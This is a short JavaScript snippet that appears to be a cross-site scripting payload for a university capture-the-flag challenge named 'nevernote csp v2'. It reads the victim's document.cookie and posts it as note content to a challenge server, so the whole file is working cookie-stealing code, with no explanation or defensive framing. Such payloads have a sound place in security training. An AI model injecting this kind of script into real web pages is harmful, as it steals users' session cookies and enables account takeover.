var xhr = new XMLHttpRequest();
xhr.open("POST", "http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", true);
xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");

const body = JSON.stringify({
  title: 'nevernote csp v2', content: document.cookie, submit: 'save'
});

xhr.onload = function() {
  if (xhr.readyState === 4) {
    console.log("Response:", xhr.responseText);
  }
};

xhr.send(body);
